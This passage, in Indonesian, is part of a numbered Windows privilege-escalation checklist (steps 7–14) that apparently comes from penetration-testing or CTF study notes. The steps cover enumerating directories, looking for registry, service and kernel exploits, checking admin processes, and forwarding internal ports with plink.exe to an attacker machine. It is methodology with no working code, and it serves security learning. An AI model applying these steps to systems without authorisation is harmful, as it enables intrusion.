7. Buat checklist untuk priv esc
8. Lihat file di direktori umum seperi `Desktop`, `Documents`, `C:\`, `C:\Users`, `C:\Program Files` dan lain-lain
9. Jika menemukan file yang menarik, cari informasinya lebih lanjut
10. Coba sesuatu yang tidak sulit seperti registry,exploit,services dan lain-lain
11. Lihat process yang dijalankan oleh admin, lihat versinya dan cari exploitnya
12. Cek internal port, mungkin ada sesuatu yang menarik, kita bisa forward portnya  menggunakan `plink.exe` agar bisa diakses dari attacker machine
13. Jika masih belum bisa nemu priv esc ke admin, coba baca lagi hasil enumeration dan coba pahami lagi mungkin ada yang menarik, cek nama yang mungkin tidak familiar di windows, jika masih belum bisa juga, coba kernel exploits
14. Don't panic